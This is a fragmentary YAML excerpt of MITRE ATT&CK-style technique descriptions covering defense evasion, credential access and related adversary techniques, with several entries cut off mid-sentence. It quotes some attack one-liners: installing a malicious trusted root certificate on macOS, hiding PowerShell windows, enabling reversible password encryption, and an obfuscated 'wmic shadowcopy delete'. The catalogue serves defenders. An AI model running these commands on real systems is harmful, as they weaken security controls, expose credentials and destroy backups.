        This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

        Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

        Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

        There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)

      name: 'Subvert Trust Controls: Install Root Certificate'
      description: |-
        Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

        Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)

        Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)

        Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)

        In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)

      description: |-
        Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

        Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)

        Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)

        MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)

        An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)

        Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)

        Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

        Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)

        for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566),
        or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while
        impersonating a known sender such as an executive, colleague, or third-party
        vendor. Established trust can then be leveraged to accomplish an adversary’s
        ultimate goals, possibly against multiple victims. \n \nIn many cases of business
        email compromise or email fraud campaigns, adversaries use impersonation to
        defraud victims -- deceiving them into sending money or divulging information
        that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries
        will often also use social engineering techniques such as manipulative and
        persuasive language in email subject lines and body text such as `payment`,
        `request`, or `urgent` to push the victim to act quickly before malicious
        activity is detected. These campaigns are often specifically targeted against
        people who, due to job roles and/or accesses, can carry out the adversary’s
        goal.   \n \nImpersonation is typically preceded by reconnaissance techniques
        such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589)
        and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591)
        as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001))
        to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere
        is the potential for multiple victims in campaigns involving impersonation.
        For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586)
        targeting one organization which can then be used to support impersonation
        against other entities.(Citation: VEC)"

      description: "Adversaries may modify settings that directly affect the size,
        locations, and resources available to cloud compute infrastructure in order
        to evade defenses. These settings may include service quotas, subscription
        associations, tenant-wide policies, or other configurations that impact available
        compute. Such modifications may allow adversaries to abuse the victim’s compute
        resources to achieve their goals, potentially without affecting the execution
        of running instances and/or revealing their activities to the victim.\n\nFor
        example, cloud providers often limit customer usage of compute resources via
        quotas. Customers may request adjustments to these quotas to support increased
        computing needs, though these adjustments may require approval from the cloud
        provider. Adversaries who compromise a cloud environment may similarly request
        quota adjustments in order to support their activities, such as enabling additional
        [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising
        suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking
        2023) Adversaries may also increase allowed resource usage by modifying any
        tenant-wide policies that limit the sizes of deployed virtual machines.(Citation:
        Microsoft Azure Policy)\n\nAdversaries may also modify settings that affect
        where cloud resources can be deployed, such as enabling [Unused/Unsupported

      description: |-
        An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.

        For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)

      description: "Adversaries may use hidden windows to conceal malicious activity
        from the plain sight of users. In some cases, windows that would typically
        be displayed when an application carries out an operation can be hidden. This
        may be utilized by system administrators to avoid disrupting user work environments
        when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities
        to hide otherwise visible windows from users so as not to alert the user to
        adversary activity on the system.(Citation: Antiquated Mac Malware)\n\nOn
        macOS, the configurations for how applications run are listed in property
        list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>,
        which allows for Java applications to prevent the application's icon from
        appearing in the Dock. A common use for this is when applications run in the
        system tray, but don't also want to show up in the Dock.\n\nSimilarly, on
        Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001),
        Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005)
        to make windows hidden. One example of this is <code>powershell.exe -WindowStyle
        Hidden</code>.(Citation: PowerShell About 2019)\n\nThe Windows Registry can
        also be edited to hide application windows from the current user. For example,
        by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe`
        Registry key to a maximum value, PowerShell windows will open off screen and
        be hidden.(Citation: Cantoris Computing)\n\nIn addition, Windows supports
        the `CreateDesktop()` API that can create a hidden desktop window with its
        own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation:
        Anatomy of an hVNC Attack)  All applications running on the hidden desktop
        window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be
        invisible to other desktops windows.\n\nAdversaries may also leverage cmd.exe(Citation:
        Cybereason - Hidden Malicious Remote Access) as a parent process, and then
        utilize a LOLBin, such as DeviceCredentialDeployment.exe,(Citation: LOLBAS
        Project GitHub Device Cred Dep)(Citation: SecureList BlueNoroff Device Cred
        Dev) to hide windows."

      description: |-
        Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)

        Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.

        ClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)

        Adversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)

        Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)

      name: Relocate Malware
      description: |-
        Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.

        Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)

        Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders. Moving payloads into target directories does not alter the Creation timestamp, thereby evading detection logic reliant on modifications to this artifact (i.e., [Timestomp](https://attack.mitre.org/techniques/T1070/006)).

      description: "Adversaries may disable or modify conditional access policies
        to enable persistent access to compromised accounts. Conditional access policies
        are additional verifications used by identity providers and identity and access
        management systems to determine whether a user should be granted access to
        a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be

        Access Policies) In some cases, identity providers may also support the use
        of risk-based metrics to deny sign-ins based on a variety of indicators. In
        AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary
        constraints such as the source IP, the date the request was made, and the
        nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation:
        GCP IAM Conditions) These measures help to prevent compromised credentials
        from resulting in unauthorized access to data or resources, as well as limit
        user permissions to only those required. \n\nBy modifying conditional access
        policies, such as adding additional trusted IP ranges, removing [Multi-Factor
        Authentication](https://attack.mitre.org/techniques/T1556/006) requirements,
        or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535),

      description: "Adversaries may inject malicious code into processes via the /proc
        filesystem in order to evade process-based defenses as well as possibly elevate
        privileges. Proc memory injection is a method of executing arbitrary code
        in the address space of a separate live process. \n\nProc memory injection
        involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>)
        then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.
        Each running process has its own directory, which includes memory mappings.
        Proc memory injection is commonly performed by overwriting the target processes’
        stack using memory mappings provided by the /proc filesystem. This information
        can be used to enumerate offsets (including the stack) and gadgets (or instructions
        within the program that can be used to build a malicious payload) otherwise
        hidden by process memory protections such as address space layout randomization
        (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code>
        can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux
        Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker
        Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate
        a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),
        proc memory injection may target child processes (such as a backgrounded copy
        of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context
        of another process may allow access to the process's memory, system/network
        resources, and possibly elevated privileges. Execution via proc memory injection
        may also evade detection from security products since the execution is masked
        under a legitimate process. "

      name: Patch System Image
      description: "Adversaries may modify the operating system of a network device
        to introduce new capabilities or weaken existing defenses.(Citation: Killing
        the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation:
        Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation:
        Juniper Netscreen of the Dead) Some network devices are built with a monolithic
        architecture, where the entire operating system and most of the functionality
        of the device is contained within a single file.  Adversaries may change this
        file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo
        change the operating system in storage, the adversary will typically use the
        standard procedures available to device operators. This may involve downloading
        a new file via typical protocols used on network devices, such as TFTP, FTP,
        SCP, or a console connection.  The original file may be overwritten, or a
        new file may be written alongside of it and the device reconfigured to boot
        to the compromised image.\n\nTo change the operating system in memory, the
        adversary typically can use one of two methods. In the first, the adversary
        would make use of native debug commands in the original, unaltered running
        operating system that allow them to directly modify the relevant memory addresses
        containing the running operating system.  This method typically requires administrative
        level access to the device.\n\nIn the second method for changing the operating
        system in memory, the adversary would make use of the boot loader. The boot
        loader is the first piece of software that loads when the device starts that,
        in turn, will launch the operating system.  Adversaries may use malicious
        code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)
        method, to directly manipulate running operating system code in memory.  This
        malicious code in the bootloader provides the capability of direct memory
        manipulation to the adversary, allowing them to patch the live operating system
        during runtime.\n\nBy modifying the instructions stored in the system image
        file, adversaries may either weaken existing defenses or provision new capabilities
        that the device did not have before. Examples of existing defenses that can
        be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600),
        authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004),
        and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).
        \ Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001),
        [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port
        Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may
        also compromise existing commands in the operating system to produce false
        output to mislead defenders.   When this method is used in conjunction with
        [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one
        example of a compromised system command may include changing the output of
        the command that shows the version of the currently running operating system.
        \ By patching the operating system, the adversary can change this command
        to instead display the original, higher revision number that they replaced
        through the system downgrade. \n\nWhen the operating system is patched in
        storage, this can be achieved in either the resident storage (typically a
        form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005).
        \n\nWhen the technique is performed on the running operating system in memory
        and not on the stored copy, this technique will not survive across reboots.
        \ However, live memory modification of the operating system can be combined
        with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve
        persistence. "

        to successfully authenticate as any domain user account (until the the skeleton
        key is erased from memory by a reboot of the domain controller). Authenticated

        Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)

        Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.

        For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)

      name: Reversible Encryption
      description: |-
        An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

        If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

        1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
        2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
        3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
        4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

        With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

        An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

      description: |-
        Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)

        For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)

        Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)

        Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)

      description: |-
        Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)

        Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

        Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)

        Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

        This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)

      name: Access Token Manipulation
      description: |-
        Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

        An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

        Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.

      description: "Adversaries may perform software packing or virtual machine software
        protection to conceal their code. Software packing is a method of compressing
        or encrypting an executable. Packing an executable changes the file signature
        in an attempt to avoid signature-based detection. Most decompression techniques
        decompress the executable code in memory. Virtual machine software protection
        translates an executable's original code into a special format that only a
        special virtual machine can run. A virtual machine is then called to run this
        code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software
        packing are called packers. Example packers are MPRESS and UPX. A more comprehensive
        list of known packers is available, but adversaries may create their own packing
        techniques that do not leave the same artifacts as well-known packers to evade
        defenses.(Citation: Awesome Executable Packing)  "

      description: |-
        Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)

        Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)

      name: Debugger Evasion
      description: |-
        Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

        Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

        Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

        Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)

        Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)

      description: |-
        Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

        For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).

        Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.

This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

        When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

        Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)

      description: |+
